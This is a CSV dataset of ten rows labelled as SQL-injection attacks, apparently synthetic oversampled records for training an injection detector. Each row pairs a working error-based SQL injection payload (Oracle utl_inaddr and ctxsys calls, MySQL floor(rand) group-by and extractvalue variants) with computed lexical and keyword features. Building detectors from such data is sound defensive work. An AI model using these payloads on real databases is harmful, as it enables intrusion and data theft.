id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,1.435403168202579,337.3426240172934,35.406375109189625,3.6391352802724044,90.21912532756886,50.6713120086467,138.85856179026746,57.593624890810375,0.267790259889517,0.15000369736695887,0.41144396103299646,0.1707620817105277,0.0,0.296812445405189,2.703187554594811,0.0,0.0,2.2968124454051893,0.0,28.59362489081038,0.0,2.109562663784433,0.29681244540518925,25.0,0.0,0.2968124454051892,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.2968124454051891,1.0,0.29681244540518914,0.703187554594811,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.296812445405189
SMOTE_000002,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000004,1.7146643807281696,335.3558329776351,35.37773814605213,3.6850924186046177,95.73357112368723,47.06660721907819,135.93339278092182,56.622261853947876,0.2852583336222956,0.14047871628870262,0.4054110561627425,0.1688518939262593,1.2445237078957443,0.0,0.6888690730260638,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.688869073026062,0.31113092697393624,0.0,0.0,0.6888690730260639,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6222618539478724,0.6888690730260638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.311130926973936
SMOTE_000003,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,0.6244656642222989,349.63322670763847,34.24451552824102,3.5671932592638163,87.5893509335666,55.89968012291542,147.02193788703593,59.12225776412051,0.2505542637290359,0.15985832952396054,0.4204854730978352,0.16910193364916845,0.0,1.3667732923615261,1.8777422358794915,0.0,0.0,3.0,0.0,29.755484471758983,0.0,0.3667732923615261,0.8777422358794915,24.877742235879495,0.0,1.0,0.8777422358794913,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.8777422358794913,1.0,1.0,0.1222577641205087,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000004,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,1.14738050928258,231.8825241449577,40.056812842581834,3.8728927599230696,70.54164708946672,42.48483424688488,94.48483424688487,24.371208561721218,0.3039464135644447,0.1828883478230674,0.4079354930603296,0.1052297455521583,0.0,0.6856042808606102,1.0,0.0,1.0,1.6856042808606102,0.0,16.0,0.0,0.0,3.0,3.685604280860611,0.0,0.6856042808606103,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.6856042808606102,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.68560428086061
SMOTE_000005,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,0.2950285063335497,346.03062181566395,36.0,3.7268465188546154,98.57589704435297,48.0,139.69706931739498,59.75765545391599,0.28485686300913093,0.1387336440343047,0.4037245966631821,0.1726848962933823,0.0,3.7576554539159837,1.0,0.0,0.0,2.939413863478996,0.0,28.0,0.0,3.0,0.0,23.939413863478997,0.0,0.9394138634789961,0.0,0.060586136521003864,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9394138634789961,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.939413863478996
SMOTE_000006,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,1.6433871167529317,263.54711383156854,37.29307678502831,4.005287346971588,98.20249955134202,37.58615357005663,95.46538392514157,32.29307678502831,0.37312506745508184,0.14240367257928588,0.36173520567099215,0.12273605429464013,1.0,0.0,0.6465383925141572,0.0,2.0,1.3232691962570786,0.0,18.646538392514156,0.0,2.0,5.676730803742921,3.9698075887712356,1.0,0.0,0.3232691962570786,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.32326919625707873,2.0,0.0,0.32326919625707856,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.646538392514158
SMOTE_000007,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,2.189426591998168,194.83359371487904,32.68124998778402,3.6920069662995147,63.789843751526995,26.732031230149037,80.31171873320304,24.0,0.3282115224867277,0.13627575202795206,0.4120634111575984,0.12344931432772183,3.3695312545809917,0.0,0.21015624847300268,0.0,0.21015624847300274,0.21015624847300263,0.0,16.0,0.0,0.0,3.7898437515269974,0.6304687454190088,1.0,0.0,0.0,0.21015624847300274,0.0,0.21015624847300274,1.0,0.0,0.0,1.0,0.0,0.2101562484730024,0.0,0.0,0.0,0.7898437515269973,0.21015624847300274,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7898437515269973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.21015624847300274,0.0,0.2101562484730028,0.2101562484730028,3.630468745419008
SMOTE_000008,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,1.5910533695090692,312.61444100388366,38.0,3.9755995291472495,110.4515460433094,46.29072374014356,117.04949028539478,38.82268093503589,0.354925441826221,0.1476184601047791,0.3730297442890077,0.12442635377999219,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.64536187007178,0.0,1.451546043309407,5.274226978345297,5.725773021654703,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.548453956690593,0.8226809350358897,0.7257730216547036,1.7257730216547036,0.2742269783452965,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7257730216547034,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.82268093503589
SMOTE_000009,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,4.111297137582924,210.7985377227185,35.046709876116616,4.062329911450137,94.98537722718496,21.26279492621316,71.55036556932038,23.0,0.449748555289717,0.10165505860318455,0.3394777655267028,0.10911862058039569,3.5503655693203764,0.0,0.0,0.0,0.0,2.449634430679624,0.0,11.100731138640752,0.0,1.798537722718496,3.2014622772815042,2.449634430679624,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5503655693203761,0.0,1.449634430679624,0.0,0.449634430679624,0.8992688613592479,1.4496344306796238,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5503655693203761,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5503655693203761,0.5503655693203761,5.899268861359248
SMOTE_000010,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,1.9780068718375414,234.9432203761274,32.371186415915055,3.8288799561708466,77.22711849549034,42.48474566366023,88.34491546472202,26.88644075225483,0.3288568804767287,0.18092945234899852,0.37584159052844274,0.11437207664583009,1.3711864159150564,1.2576271681698872,0.0,0.0,0.0,2.0,0.0,15.257627168169886,0.6288135840849435,0.0,5.0,3.371186415915057,0.6855932079575282,0.3144067920424718,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.6855932079575282,0.0,0.6855932079575282,0.0,0.3144067920424719,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.6855932079575275
